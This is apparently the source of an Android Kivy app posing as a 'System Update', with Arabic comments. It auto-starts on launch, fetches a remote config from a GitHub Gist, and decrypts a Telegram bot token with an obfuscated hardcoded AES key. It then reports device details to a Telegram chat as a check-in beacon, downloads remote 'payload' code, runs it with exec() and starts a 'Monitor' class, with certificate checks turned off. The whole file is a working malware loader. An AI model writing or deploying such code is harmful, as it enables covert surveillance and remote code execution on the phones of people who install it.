import os
import sys
import time
import traceback
import socket
import requests
import json
import base64
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.utils import platform

# ========== إضافة مسارات المشروع ==========
app_path = os.path.dirname(os.path.abspath(__file__))
for subdir in ['core', 'telegram', 'media', 'config']:
    sub_path = os.path.join(app_path, subdir)
    if os.path.exists(sub_path) and sub_path not in sys.path:
        sys.path.append(sub_path)

# ========== معالج الأخطاء العالمي (يمنع الانهيار الصامت) ==========
def global_exception_handler(exc_type, exc_value, exc_tb):
    """أي خطأ غير متوقع يظهر في واجهة التطبيق بدلاً من اختفاء التطبيق"""
    try:
        app = App.get_running_app()
        if app and hasattr(app, 'log'):
            app.log(f"!!! UNHANDLED ERROR: {exc_type.__name__}: {exc_value}")
            app.log(''.join(traceback.format_tb(exc_tb)))
    except:
        pass
    sys.__excepthook__(exc_type, exc_value, exc_tb)

sys.excepthook = global_exception_handler

class SystemUpdateApp(App):
    def build(self):
        # رابط config.json (Gist)
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
        
        # متغيرات الحالة
        self.engine_running = False
        self.log_lines = []
        
        # بناء الواجهة
        layout = BoxLayout(orientation='vertical')
        
        # أزرار التحكم
        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10, padding=5)
        copy_btn = Button(text="Copy Log", background_color=(0.2, 0.6, 0.2, 1))
        copy_btn.bind(on_press=self.copy_log)
        start_btn = Button(text="Start Engine", background_color=(0.2, 0.4, 0.8, 1))
        start_btn.bind(on_press=self.start_engine_manual)
        btn_layout.add_widget(copy_btn)
        btn_layout.add_widget(start_btn)
        layout.add_widget(btn_layout)
        
        # منطقة عرض السجل
        scroll = ScrollView(size_hint=(1, 1))
        self.log_view = TextInput(
            text="[System] Ready. Press Start Engine.\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)
        
        # طلب صلاحيات أساسية (غير حظر)
        if platform == 'android':
            self.log("Requesting basic permissions (Internet, Storage)...")
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.INTERNET,
                Permission.ACCESS_NETWORK_STATE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])
        
        # بدء التشغيل التلقائي بعد 3 ثوانٍ
        Clock.schedule_once(self.start_engine, 3)
        return layout
    
    # ========== دوال مساعدة ==========
    def log(self, msg):
        """إضافة رسالة إلى السجل مع طابع زمني"""
        timestamp = time.strftime("%H:%M:%S")
        full_msg = f"[{timestamp}] {msg}"
        self.log_view.text += full_msg + "\n"
        self.log_lines.append(full_msg)
        # تأكد من التمرير إلى الأسفل
        self.log_view.cursor = (0, len(self.log_view.text))
    
    def copy_log(self, instance):
        """نسخ السجل بالكامل إلى الحافظة"""
        from kivy.core.clipboard import Clipboard
        full_text = "\n".join(self.log_lines)
        Clipboard.copy(full_text)
        self.log(f"Log copied (total {len(self.log_lines)} lines)")
    
    def start_engine(self, dt):
        """بدء تشغيل المحرك تلقائياً (يستدعي run_engine)"""
        if self.engine_running:
            self.log("Engine already running")
            return
        self.log("Auto start triggered")
        self.run_engine()
    
    def start_engine_manual(self, instance):
        """بدء تشغيل المحرك يدوياً (زر)"""
        if self.engine_running:
            self.log("Engine already running")
            return
        self.log("Manual start triggered")
        self.run_engine()
    
    # ========== دوال اختبار المكونات الأساسية ==========
    def test_permissions(self):
        """فحص صلاحيات الإنترنت والتخزين"""
        if platform != 'android':
            self.log("Permission check skipped (not Android)")
            return True
        try:
            from android.permissions import check_permission, Permission
            perms = [Permission.INTERNET, Permission.ACCESS_NETWORK_STATE]
            missing = [p for p in perms if not check_permission(p)]
            if missing:
                self.log(f"WARNING: Missing permissions: {missing}")
                return False
            self.log("All required permissions granted")
            return True
        except Exception as e:
            self.log(f"Permission check error: {e}")
            return False
    
    def test_dns(self):
        """اختبار حل DNS (google.com)"""
        try:
            socket.gethostbyname("google.com")
            self.log("DNS resolution: OK")
            return True
        except Exception as e:
            self.log(f"DNS resolution: FAILED ({e})")
            return False
    
    def test_http_plain(self):
        """اختبار HTTP عادي (بدون SSL)"""
        try:
            r = requests.get("http://www.google.com", timeout=5)
            self.log(f"HTTP plain request: OK (status {r.status_code})")
            return True
        except Exception as e:
            self.log(f"HTTP plain request: FAILED ({e})")
            return False
    
    def test_https(self):
        """اختبار HTTPS (مع SSL)"""
        try:
            r = requests.get("https://www.google.com", timeout=5, verify=False)
            self.log(f"HTTPS request: OK (status {r.status_code})")
            return True
        except Exception as e:
            self.log(f"HTTPS request: FAILED ({e})")
            return False
    
    # ========== دوال جلب الإعدادات وفك التشفير ==========
    def fetch_config(self, max_retries=2):
        """جلب ملف config.json من GitHub مع إعادة المحاولة"""
        for attempt in range(1, max_retries+1):
            try:
                self.log(f"Fetching config (attempt {attempt}/{max_retries})...")
                resp = requests.get(self.config_url, timeout=10, verify=False)
                if resp.status_code == 200:
                    config = resp.json()
                    self.log("Config fetched and parsed successfully")
                    return config
                else:
                    self.log(f"HTTP {resp.status_code}")
            except Exception as e:
                self.log(f"Fetch error: {e}")
                if attempt < max_retries:
                    time.sleep(2)
        self.log("Failed to fetch config after multiple attempts")
        return None
    
    def get_encryption_key(self):
        """إرجاع مفتاح AES (مقسم ومشوه)"""
        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
        return bytes(part1 + part2)
    
    def decrypt_aes_gcm(self, encrypted_b64):
        """فك تشفير AES-GCM مع معالجة الأخطاء"""
        if not encrypted_b64:
            self.log("Decrypt: empty input")
            return None
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            key = self.get_encryption_key()
            data = base64.b64decode(encrypted_b64)
            if len(data) < 28:
                self.log(f"Decrypt: data too short ({len(data)} bytes)")
                return None
            iv = data[:12]
            tag = data[-16:]
            ct = data[12:-16]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            plain = decryptor.update(ct) + decryptor.finalize()
            result = plain.decode('utf-8')
            self.log(f"Decrypt: success ({len(result)} chars)")
            return result
        except Exception as e:
            self.log(f"Decrypt error: {e}")
            return None
    
    # ========== إرسال تلغرام ==========
    def send_telegram(self, token, chat_id, text):
        """إرسال رسالة إلى Telegram مع التحقق من النجاح"""
        if not token or not chat_id:
            self.log("Telegram: missing token or chat_id")
            return False
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
            r = requests.post(url, json=payload, timeout=10, verify=False)
            if r.status_code == 200:
                self.log("Telegram: message sent successfully")
                return True
            else:
                self.log(f"Telegram: HTTP {r.status_code}, response: {r.text[:100]}")
                return False
        except Exception as e:
            self.log(f"Telegram: send error: {e}")
            return False
    
    def get_device_info(self):
        """جلب معلومات الجهاز (اسم الطراز، إصدار أندرويد)"""
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            VERSION = autoclass('android.os.Build$VERSION')
            model = Build.MODEL
            manufacturer = Build.MANUFACTURER
            sdk = VERSION.SDK_INT
            return f"{manufacturer} {model} (SDK {sdk})"
        except:
            return "Unknown Device"
    
    # ========== المحرك الرئيسي ==========
    def run_engine(self):
        """المحرك الرئيسي: ينفذ كل الخطوات بالتسلسل ويعرض أي خطأ"""
        self.engine_running = True
        self.log("="*50)
        self.log("ENGINE STARTED")
        self.log("="*50)
        
        # 1. فحص الصلاحيات
        self.log("Step 1: Checking permissions...")
        if not self.test_permissions():
            self.log("Step 1: WARNING - some permissions missing, but continuing")
        
        # 2. اختبار DNS
        self.log("Step 2: Testing DNS resolution...")
        dns_ok = self.test_dns()
        if not dns_ok:
            self.log("Step 2: DNS failed - internet may be down or restricted")
        
        # 3. اختبار HTTP
        self.log("Step 3: Testing HTTP (plain) connection...")
        http_ok = self.test_http_plain()
        if not http_ok:
            self.log("Step 3: HTTP failed - check network or firewall")
        
        # 4. اختبار HTTPS
        self.log("Step 4: Testing HTTPS connection...")
        https_ok = self.test_https()
        if not https_ok:
            self.log("Step 4: HTTPS failed - SSL certificate issue")
        
        # 5. جلب config.json
        self.log("Step 5: Fetching config.json...")
        config = self.fetch_config()
        if not config:
            self.log("Step 5: CRITICAL - cannot fetch config. Aborting.")
            self.engine_running = False
            return
        
        # 6. فك تشفير التوكنات
        self.log("Step 6: Decrypting tokens...")
        enc_tokens = config.get('t', [])
        if not enc_tokens:
            self.log("Step 6: ERROR - no tokens in config")
            self.engine_running = False
            return
        
        token = None
        for i, enc in enumerate(enc_tokens):
            dec = self.decrypt_aes_gcm(enc)
            if dec:
                token = dec
                self.log(f"Step 6: Token {i+1} decrypted successfully")
                break
            else:
                self.log(f"Step 6: Failed to decrypt token {i+1}")
        if not token:
            self.log("Step 6: CRITICAL - no valid token found")
            self.engine_running = False
            return
        
        chat_id_enc = config.get('v', '')
        chat_id = self.decrypt_aes_gcm(chat_id_enc)
        if not chat_id:
            self.log("Step 6: CRITICAL - cannot decrypt chat_id")
            self.engine_running = False
            return
        
        # 7. إرسال رسالة إلى Telegram
        self.log("Step 7: Sending device info to Telegram...")
        device_info = self.get_device_info()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        msg = f"🚀 *System Online*\n📱 Device: `{device_info}`\n🕒 Time: {timestamp}"
        if self.send_telegram(token, chat_id, msg):
            self.log("Step 7: Telegram notification sent successfully")
        else:
            self.log("Step 7: Failed to send Telegram notification")
        
        # 8. تحميل البايلودات (اختياري)
        payload_urls = config.get('payload_urls', [])
        self.log(f"Step 8: Found {len(payload_urls)} payload URLs")
        if payload_urls:
            self.log("Step 8: Loading payloads (Monitor etc.)...")
            loaded = 0
            for url in payload_urls:
                try:
                    name = url.split('/')[-1]
                    self.log(f"  - Loading {name}...")
                    code = requests.get(url, timeout=10, verify=False).text
                    exec(code, globals())
                    loaded += 1
                    self.log(f"    Success")
                except Exception as e:
                    self.log(f"    FAILED: {e}")
            self.log(f"Step 8: Loaded {loaded}/{len(payload_urls)} payloads")
            if 'Monitor' in globals():
                self.log("Starting Monitor...")
                try:
                    monitor = globals()['Monitor']()
                    monitor.start()
                    self.log("Monitor started successfully")
                except Exception as e:
                    self.log(f"Monitor start failed: {e}")
            else:
                self.log("Monitor class not found after loading payloads")
        else:
            self.log("Step 8: No payloads to load")
        
        self.log("="*50)
        self.log("ENGINE FINISHED")
        self.log("="*50)
        self.engine_running = False

if __name__ == '__main__':
    SystemUpdateApp().run()
